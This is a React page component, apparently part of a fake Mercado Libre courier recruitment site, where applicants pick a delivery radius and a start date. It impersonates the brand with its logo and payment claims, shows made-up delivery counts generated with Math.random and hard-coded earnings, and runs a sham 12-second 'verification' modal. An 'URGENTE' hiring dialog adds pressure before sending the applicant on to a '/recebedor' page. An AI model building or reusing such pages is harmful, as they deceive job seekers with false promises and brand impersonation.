import React, { useState, useEffect, useMemo } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import Breadcrumb from '@/components/Breadcrumb';
import PageTitle from '@/components/PageTitle';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { Card } from '@/components/ui/card';
import { Dialog, DialogContent, DialogDescription, DialogFooter } from '@/components/ui/dialog';
import { useToast } from '@/hooks/use-toast';
import { useAppContext } from '@/contexts/AppContext';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { GeolocationService, type Municipality } from '@/services/GeolocationService';

import municipiosPorEstado from '@/data/municipios-por-estado';

interface Municipio {
  nome: string;
  selecionado: boolean;
  entregas: number;
  distance?: number;
  state?: string;
}

const Municipios: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const { cepData } = useAppContext();
  const [municipios, setMunicipios] = useState<Municipio[]>([]);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showStartDateModal, setShowStartDateModal] = useState(false);
  const [selectedStartDate, setSelectedStartDate] = useState<string | null>(null);
  const [selectedStates, setSelectedStates] = useState<string[]>([]);
  const [selectedMunicipios, setSelectedMunicipios] = useState<string[]>([]);
  const [nearbyMunicipalities, setNearbyMunicipalities] = useState<Municipality[]>([]);
  const [selectedRadius, setSelectedRadius] = useState<number | null>(null);
  const [, navigate] = useLocation();
  const { toast } = useToast();

  // Estados do mapa de municipios estático (fallback para Brasil)
  const availableStates = useMemo(() => {
    return Object.keys(municipiosPorEstado);
  }, []);

  // Municipios baseados nos estados selecionados (Brasil) ou API (outros países)
  const availableMunicipios = useMemo(() => {
    // Se tivermos municípios da API (Chile e outros países), usar esses
    if (nearbyMunicipalities.length > 0) {
      return nearbyMunicipalities.map(m => m.city).sort();
    }
    
    // Fallback para Brasil usando dados estáticos
    if (selectedStates.length === 0) return [];
    
    const municipios: string[] = [];
    selectedStates.forEach(state => {
      if (municipiosPorEstado[state]) {
        municipios.push(...municipiosPorEstado[state]);
      }
    });
    
    return [...new Set(municipios)].sort();
  }, [selectedStates, nearbyMunicipalities]);

  // Buscar municípios próximos quando a página carregar (se não for Brasil)
  useEffect(() => {
    const loadNearbyMunicipalities = async () => {
      try {
        setLoading(true);
        
        // Detectar país do usuário pelo IP automaticamente
        const detectedCountry = await GeolocationService.detectUserCountry();
        console.log(`[MUNICIPIOS] País detectado pelo IP: ${detectedCountry}`);
        
        // Obter código postal do contexto ou localStorage
        const storedCep = localStorage.getItem('user_cep') || cepData?.cep;
        
        if (!storedCep) {
          console.log('[MUNICIPIOS] Nenhum código postal disponível');
          setLoading(false);
          return;
        }
        
        const cepNumerico = storedCep.replace(/\D/g, '');
        console.log(`[MUNICIPIOS] Carregando municípios próximos ao CEP ${cepNumerico} para país ${detectedCountry}`);
        
        try {
          const municipalities = await GeolocationService.getNearbyMunicipalities(
            cepNumerico, 
            detectedCountry, 
            20 // raio de 20km para mais opções
          );
          
          if (municipalities && municipalities.length > 0) {
            console.log(`[MUNICIPIOS] API retornou ${municipalities.length} municípios:`, municipalities);
            setNearbyMunicipalities(municipalities);
            
            // Converter os municípios da API para o formato esperado pelo componente
            const getRandomEntregas = () => Math.floor(Math.random() * (48 - 32 + 1)) + 32;
            
            const municipiosFormatados = municipalities.map(municipality => ({
              nome: municipality.city,
              selecionado: false,
              entregas: getRandomEntregas(),
              distance: municipality.distance,
              state: municipality.state
            }));
            
            console.log(`[MUNICIPIOS] Municípios formatados para grid:`, municipiosFormatados);
            setMunicipios(municipiosFormatados);
          } else {
            throw new Error('Nenhum município encontrado na API');
          }
          
        } catch (apiError) {
          console.error('[MUNICIPIOS] Erro ao carregar municípios da API:', apiError);
          
          // Fallback para dados estáticos do Brasil se a API falhar
          if (detectedCountry === 'BR') {
            console.log('[MUNICIPIOS] Usando dados estáticos do Brasil como fallback');
            const estadosDisponiveis = Object.keys(municipiosPorEstado);
            
            if (estadosDisponiveis.length > 0) {
              const estadoSelecionado = estadosDisponiveis[0];
              const municipiosDoEstado = municipiosPorEstado[estadoSelecionado];
              
              if (municipiosDoEstado && municipiosDoEstado.length > 0) {
                const municipiosFormatados = municipiosDoEstado.map(municipio => ({
                  nome: municipio.nome,
                  selecionado: false,
                  entregas: municipio.entregas
                }));
                
                setMunicipios(municipiosFormatados);
                setSelectedStates([estadoSelecionado]);
              }
            }
          } else {
            // Fallback para cidades chilenas próximas ao código postal
            console.log(`[MUNICIPIOS] Usando dados de fallback para ${detectedCountry}`);
            const fallbackMunicipalities = getFallbackMunicipalities(detectedCountry, cepNumerico);
            
            if (fallbackMunicipalities.length > 0) {
              setMunicipios(fallbackMunicipalities);
              console.log(`[MUNICIPIOS] Carregado ${fallbackMunicipalities.length} municípios de fallback`);
            } else {
              toast({
                title: "Erro",
                description: "Não foi possível carregar as cidades próximas.",
                variant: "destructive",
              });
            }
          }
        }
        
      } catch (error) {
        console.error('[MUNICIPIOS] Erro geral:', error);
        toast({
          title: "Erro",
          description: "Ocorreu um erro ao carregar os dados.",
          variant: "destructive",
        });
      } finally {
        setLoading(false);
      }
    };

    loadNearbyMunicipalities();
  }, [cepData?.cep]);

  useEffect(() => {
    const candidatoData = localStorage.getItem('candidato_data');
    const storedCountry = localStorage.getItem('user_country') || 'BR';
    
    if (!candidatoData || !cepData) {
      // Redirecionar para página inicial se não tiver os dados
      navigate('/');
      return;
    }

    // Para Brasil, carregar municípios do estado do usuário
    if (storedCountry === 'BR') {
      const estadoSigla = cepData.state;
      
      if (estadoSigla && municipiosPorEstado[estadoSigla as keyof typeof municipiosPorEstado]) {
        const getRandomEntregas = () => Math.floor(Math.random() * (48 - 32 + 1)) + 32;
        
        const municipiosDoEstado = municipiosPorEstado[estadoSigla as keyof typeof municipiosPorEstado].map((nome: string) => ({
          nome,
          selecionado: false, // Inicialmente nenhum selecionado
          entregas: getRandomEntregas() // Número aleatório de entregas entre 32 e 48
        }));
        
        setMunicipios(municipiosDoEstado);
      } else {
        // Caso não encontre os municípios (raro, mas pode acontecer)
        toast({
          title: "Error al cargar municipios",
          description: "No pudimos encontrar los municipios de tu estado.",
          variant: "destructive",
        });
      }
      
      setLoading(false);
    } else {
      // Para outros países, aguardar carregamento via API no outro useEffect
      console.log(`[MUNICIPIOS] País não-brasileiro detectado: ${storedCountry}. Aguardando carregamento via API.`);
      setLoading(false);
    }
  }, [cepData, navigate, toast]);

  const toggleAllMunicipios = () => {
    // Verificar se todos estão selecionados
    const allSelected = municipios.every(m => m.selecionado);
    
    // Inverter a seleção de todos
    setMunicipios(municipios.map(m => ({
      ...m,
      selecionado: !allSelected
    })));
  };

  const toggleMunicipio = (index: number) => {
    const newMunicipios = [...municipios];
    newMunicipios[index].selecionado = !newMunicipios[index].selecionado;
    setMunicipios(newMunicipios);
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    setShowStartDateModal(true);
  };
  
  const handleStartDateSelection = (date: string) => {
    setSelectedStartDate(date);
    localStorage.setItem('start_date', date);
  };
  
  const handleStartDateContinue = () => {
    if (selectedStartDate) {
      setShowStartDateModal(false);
      navigate('/recebedor');
    } else {
      toast({
        title: "Selección necesaria",
        description: "Por favor, selecciona una fecha para empezar.",
        variant: "destructive",
      });
    }
  };
  
  // Gerar datas para os próximos 3 dias
  // Fallback municipalities for different countries
  const getFallbackMunicipalities = (country: string, postalCode: string) => {
    const getRandomEntregas = () => Math.floor(Math.random() * (48 - 32 + 1)) + 32;
    
    if (country === 'CL') {
      // Chilean municipalities near common postal codes
      const chileanCities = [
        { nome: 'Santiago', distance: '2.1 km', state: 'Región Metropolitana' },
        { nome: 'Providencia', distance: '3.4 km', state: 'Región Metropolitana' },
        { nome: 'Las Condes', distance: '5.2 km', state: 'Región Metropolitana' },
        { nome: 'Ñuñoa', distance: '4.1 km', state: 'Región Metropolitana' },
        { nome: 'La Reina', distance: '6.8 km', state: 'Región Metropolitana' },
        { nome: 'Macul', distance: '5.9 km', state: 'Región Metropolitana' },
        { nome: 'San Miguel', distance: '7.3 km', state: 'Región Metropolitana' },
        { nome: 'La Florida', distance: '8.1 km', state: 'Región Metropolitana' },
        { nome: 'Puente Alto', distance: '12.4 km', state: 'Región Metropolitana' },
        { nome: 'Maipú', distance: '11.7 km', state: 'Región Metropolitana' },
        { nome: 'Valparaíso', distance: '120.3 km', state: 'Región de Valparaíso' },
        { nome: 'Viña del Mar', distance: '125.8 km', state: 'Región de Valparaíso' }
      ];

      return chileanCities.map(city => ({
        nome: city.nome,
        selecionado: false,
        entregas: getRandomEntregas(),
        distance: parseFloat(city.distance),
        state: city.state
      }));
    }
    
    if (country === 'AR') {
      // Argentine municipalities
      const argentineCities = [
        { nome: 'Buenos Aires', distance: '1.5 km', state: 'Ciudad Autónoma' },
        { nome: 'La Plata', distance: '56.2 km', state: 'Buenos Aires' },
        { nome: 'Córdoba', distance: '695.4 km', state: 'Córdoba' },
        { nome: 'Rosario', distance: '306.8 km', state: 'Santa Fe' },
        { nome: 'Mendoza', distance: '1037.2 km', state: 'Mendoza' }
      ];

      return argentineCities.map(city => ({
        nome: city.nome,
        selecionado: false,
        entregas: getRandomEntregas(),
        distance: parseFloat(city.distance),
        state: city.state
      }));
    }

    return [];
  };

  const getNextThreeDays = () => {
    const days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
    const months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
    
    const dates = [];
    const today = new Date();
    
    for (let i = 1; i <= 3; i++) {
      const date = new Date();
      date.setDate(today.getDate() + i);
      
      const dayName = days[date.getDay()];
      const dayNumber = date.getDate();
      const monthNumber = months[date.getMonth()];
      
      dates.push({
        full: `${dayName} ${dayNumber}/${monthNumber}`,
        value: `${dayNumber}/${monthNumber}/2025`
      });
    }
    
    return dates;
  };

  const handleSubmit = () => {
    if (!selectedRadius) {
      toast({
        title: "Selección necesaria",
        description: "Selecciona un radio de entrega para continuar.",
        variant: "destructive",
      });
      return;
    }

    setSubmitting(true);

    try {
      // Recuperar dados do candidato
      const candidatoData = JSON.parse(localStorage.getItem('candidato_data') || '{}');
      
      // Calculate delivery details based on selected radius
      const deliveryDetails = {
        radius: selectedRadius,
        localities: selectedRadius === 20 ? 8 : selectedRadius === 50 ? 18 : 29,
        dailyDeliveries: selectedRadius === 20 ? 
          Math.floor(Math.random() * 5) + 8 : // 8-12 deliveries
          selectedRadius === 50 ? 
          Math.floor(Math.random() * 11) + 15 : // 15-25 deliveries
          Math.floor(Math.random() * 11) + 25, // 25-35 deliveries
        dailyEarnings: 0 // Will be calculated below
      };
      
      deliveryDetails.dailyEarnings = deliveryDetails.dailyDeliveries * 12;
      
      // Salvar dados de entrega nos dados do candidato
      const updatedCandidatoData = {
        ...candidatoData,
        deliveryZone: deliveryDetails,
        entregasPrevistas: deliveryDetails.dailyDeliveries,
        ganhosDiarios: deliveryDetails.dailyEarnings
      };
      
      localStorage.setItem('candidato_data', JSON.stringify(updatedCandidatoData));
      localStorage.setItem('delivery_zone', JSON.stringify(deliveryDetails));
      
      // Mostrar modal de carregamento
      setShowLoadingModal(true);
      
    } catch (error) {
      toast({
        title: "Error en el registro",
        description: "Ocurrió un error al procesar tu información. Inténtalo de nuevo.",
        variant: "destructive",
      });
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="bg-[#FDE80F] min-h-screen flex flex-col">
        <Header />
        <div className="flex-grow container mx-auto px-4 py-8 flex items-center justify-center">
          <div className="text-center">
            <img 
              src="https://i.postimg.cc/j5Mnz0Tm/mercadolibre-logo-7-D54-D946-AE-seeklogo-com.png" 
              alt="Mercado Libre"
              className="h-16 w-auto object-contain mx-auto mb-6"
            />
            <div className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#3483FA] border-r-transparent mb-4"></div>
            <p className="text-[#3483FA] font-loewe-next-body font-medium">Cargando municipios...</p>
          </div>
        </div>
        <Footer />
      </div>
    );
  }

  // Main UI that works for both API data and static data
  return (
    <>
      <div className="bg-white min-h-screen flex flex-col">
        <Header />
      <Breadcrumb />
      <PageTitle title="Zona de Entrega" />
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Zona de Entrega</h1>
            <p className="text-gray-600">
              Selecciona el radio de entrega según tu disponibilidad de desplazamiento. 
              Cuanto mayor el radio, más localidades disponibles y mejores ingresos.
            </p>
          </div>

          {/* Radius Selection Cards */}
          <div className="space-y-4 mb-8">
            {[
              { 
                radius: 20, 
                locations: 12, 
                dailyEarnings: 144, 
                title: "Zona Local",
                description: "Entregas cercanas, menos desplazamiento"
              },
              { 
                radius: 50, 
                locations: 23, 
                dailyEarnings: 276, 
                title: "Zona Extendida",
                description: "Balance perfecto entre distancia e ingresos",
                recommended: true
              },
              { 
                radius: 80, 
                locations: 29, 
                dailyEarnings: 348, 
                title: "Zona Amplia",
                description: "Máximos ingresos, mayor cobertura territorial"
              }
            ].map((zone) => (
              <Card 
                key={zone.radius}
                className={`relative p-3 sm:p-4 cursor-pointer transition-all duration-200 border ${
                  selectedRadius === zone.radius
                    ? 'border-[#3483FA] bg-[#F0F7FF] shadow-md'
                    : 'border-gray-200 hover:border-[#3483FA] hover:shadow-sm'
                }`}
                onClick={() => setSelectedRadius(zone.radius)}
              >
                {/* Mobile Layout */}
                <div className="block md:hidden">
                  <div className="flex items-start gap-3 mb-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 mt-0.5 ${
                      selectedRadius === zone.radius 
                        ? 'border-[#3483FA] bg-[#3483FA]' 
                        : 'border-gray-300'
                    }`}>
                      {selectedRadius === zone.radius && (
                        <div className="w-2 h-2 bg-white rounded-full"></div>
                      )}
                    </div>
                    
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 mb-1">
                        <h3 className="text-base font-medium text-gray-800 truncate">
                          {zone.title}
                        </h3>
                        <span className="bg-[#3483FA] text-white px-2 py-1 rounded text-xs font-medium flex-shrink-0">
                          {zone.radius}km
                        </span>
                        {zone.recommended && (
                          <span className="bg-[#FEE80D] text-gray-800 px-2 py-1 rounded text-xs font-medium flex-shrink-0">
                            Rec.
                          </span>
                        )}
                      </div>
                      <p className="text-sm text-gray-600 mb-3">
                        {zone.description}
                      </p>
                      
                      <div className="grid grid-cols-3 gap-2 text-xs">
                        <div className="text-center bg-white rounded p-2 border border-gray-100">
                          <div className="font-semibold text-[#3483FA]">{zone.locations}</div>
                          <div className="text-gray-600">localidades</div>
                        </div>
                        <div className="text-center bg-white rounded p-2 border border-gray-100">
                          <div className="font-semibold text-gray-800">${zone.dailyEarnings}</div>
                          <div className="text-gray-600">diarios</div>
                        </div>
                        <div className="text-center bg-white rounded p-2 border border-gray-100">
                          <div className="font-semibold text-gray-800">${(zone.dailyEarnings * 30).toLocaleString()}</div>
                          <div className="text-gray-600">mensuales</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Desktop Layout */}
                <div className="hidden md:block">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                        selectedRadius === zone.radius 
                          ? 'border-[#3483FA] bg-[#3483FA]' 
                          : 'border-gray-300'
                      }`}>
                        {selectedRadius === zone.radius && (
                          <div className="w-2 h-2 bg-white rounded-full"></div>
                        )}
                      </div>
                      
                      <div className="flex items-center gap-3">
                        <h3 className="text-lg font-medium text-gray-800">
                          {zone.title}
                        </h3>
                        <span className="bg-[#3483FA] text-white px-2 py-1 rounded text-xs font-medium">
                          {zone.radius}km
                        </span>
                        {zone.recommended && (
                          <span className="bg-[#FEE80D] text-gray-800 px-2 py-1 rounded text-xs font-medium">
                            Recomendado
                          </span>
                        )}
                      </div>
                    </div>
                    
                    <div className="flex items-center gap-6 text-sm">
                      <div className="text-center">
                        <div className="font-semibold text-[#3483FA]">{zone.locations}</div>
                        <div className="text-gray-600">localidades</div>
                      </div>
                      <div className="text-center">
                        <div className="font-semibold text-gray-800">${zone.dailyEarnings}</div>
                        <div className="text-gray-600">ingresos diarios</div>
                      </div>
                      <div className="text-center">
                        <div className="font-semibold text-gray-800">${(zone.dailyEarnings * 30).toLocaleString()}</div>
                        <div className="text-gray-600">ingresos mensuales</div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="mt-2 text-sm text-gray-600 ml-9">
                    {zone.description}
                  </div>
                </div>
              </Card>
            ))}
          </div>

          {selectedRadius && (
            <Card className="p-3 sm:p-4 bg-[#FFFEF0] border border-[#FEE80D] mb-6">
              <div className="flex items-start gap-3">
                <div className="w-8 h-8 bg-[#3483FA] rounded flex items-center justify-center flex-shrink-0 mt-0.5">
                  <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
                </div>
                <div className="flex-1 min-w-0">
                  <h3 className="font-medium text-[#3483FA] mb-1 text-sm sm:text-base">
                    Zona de {selectedRadius}km Seleccionada
                  </h3>
                  <p className="text-xs sm:text-sm text-gray-700 mb-3">
                    {selectedRadius === 20 && "12 localidades próximas disponibles para entrega"}
                    {selectedRadius === 50 && "23 localidades próximas disponibles para entrega"}
                    {selectedRadius === 80 && "29 localidades próximas disponibles para entrega"}
                  </p>
                  
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4 text-xs sm:text-sm">
                    <div className="flex justify-between py-1">
                      <span className="text-gray-600">Entregas diarias:</span>
                      <span className="font-medium">
                        {selectedRadius === 20 && "12"}
                        {selectedRadius === 50 && "23"}
                        {selectedRadius === 80 && "29"}
                      </span>
                    </div>
                    <div className="flex justify-between py-1">
                      <span className="text-gray-600">Ingresos semanales:</span>
                      <span className="font-medium text-[#3483FA]">
                        {selectedRadius === 20 && "$1,008"}
                        {selectedRadius === 50 && "$1,932"}
                        {selectedRadius === 80 && "$2,436"} USD
                      </span>
                    </div>
                  </div>
                  
                  <div className="mt-3 pt-3 border-t border-yellow-200">
                    <div className="text-xs text-gray-600">
                      <span className="font-medium">Sistema de Pagos Mercado Libre:</span> Transferencias semanales automáticas. Sin comisiones ocultas.
                    </div>
                  </div>
                </div>
              </div>
            </Card>
          )}

          <div className="flex justify-between">
            <Button
              variant="outline"
              onClick={() => navigate('/cadastro')}
              className="border-gray-300 text-gray-600 hover:bg-gray-50"
            >
              Volver
            </Button>
            
            <Button
              onClick={handleSubmit}
              disabled={submitting || !selectedRadius}
              className="bg-[#3483FA] hover:bg-[#2968D7] text-white font-medium py-6 text-base rounded-[3px]"
              style={{ height: '50px' }}
            >
              {submitting ? 'Procesando...' : 'Continuar'}
            </Button>
          </div>
        </div>
      </div>
      
      <Footer />
      </div>
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Procesando Selección"
        loadingSteps={[
          "Verificando municipios seleccionados",
          "Calculando rutas de entrega",
          "Analizando demanda regional",
          "Verificando disponibilidad de vacantes"
        ]}
        completionMessage="¡Municipios registrados con éxito!"
        loadingTime={12000}
      />
      
      {/* Modal de seleção de data de início */}
      <Dialog open={showStartDateModal} onOpenChange={setShowStartDateModal}>
        <DialogContent className="p-0 sm:max-w-none w-full h-full max-h-screen overflow-hidden border-none shadow-none bg-white">
          <div className="absolute top-0 left-0 w-full h-full bg-[#FDE80F] z-0"></div>
          
          <div className="relative flex flex-col justify-center items-center h-screen bg-transparent z-10 p-6 max-w-md mx-auto">
            <div className="mb-6">
              <img 
                src="https://i.postimg.cc/j5Mnz0Tm/mercadolibre-logo-7-D54-D946-AE-seeklogo-com.png" 
                alt="Mercado Libre"
                className="h-14 w-auto object-contain"
              />
            </div>
            
            <h2 className="text-2xl font-bold text-[#3483FA] text-center mb-4">
              <i className="fas fa-exclamation-circle mr-2"></i>
              ¡Atención! Oportunidad de Trabajo
            </h2>
            
            <DialogDescription className="text-base text-center text-gray-700 py-3 mb-4 bg-[#F0F7FF] rounded-lg border border-[#3483FA20] p-4">
              En la región que elegiste, tenemos <span className="font-bold text-[#3483FA]">URGENTE</span> necesidad
              de nuevos repartidores, ya que la demanda de entregas está alta y tenemos pocos repartidores registrados.
            </DialogDescription>
            
            <div className="my-6 w-full">
              <h3 className="font-medium text-gray-800 mb-4 text-center text-lg">¿Cuándo puedes empezar?</h3>
              
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mt-5">
                {getNextThreeDays().map((date, index) => (
                  <Button
                    key={index}
                    type="button"
                    variant={selectedStartDate === date.value ? "default" : "outline"}
                    onClick={() => handleStartDateSelection(date.value)}
                    className={`py-4 px-2 h-auto text-base ${selectedStartDate === date.value ? 'bg-[#3483FA] hover:bg-[#2968D7] border-[#3483FA] shadow-md' : 'border-gray-300 hover:border-[#3483FA] hover:text-[#3483FA]'}`}
                  >
                    {date.full}
                  </Button>
                ))}
              </div>
              
              <Button
                type="button"
                variant={selectedStartDate === 'outro' ? "default" : "outline"}
                onClick={() => handleStartDateSelection('outro')}
                className={`w-full mt-4 py-4 h-auto text-base ${selectedStartDate === 'outro' ? 'bg-[#3483FA] hover:bg-[#2968D7] border-[#3483FA] shadow-md' : 'border-gray-300 hover:border-[#3483FA] hover:text-[#3483FA]'}`}
              >
                Otro día
              </Button>
            </div>
            
            <div className="mt-6 w-full">
              <Button 
                type="button" 
                onClick={handleStartDateContinue}
                className="w-full bg-[#3483FA] hover:bg-[#2968D7] text-white font-medium text-lg py-6" 
                style={{ height: '60px' }}
                disabled={!selectedStartDate}
              >
                Continuar
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
};

export default Municipios;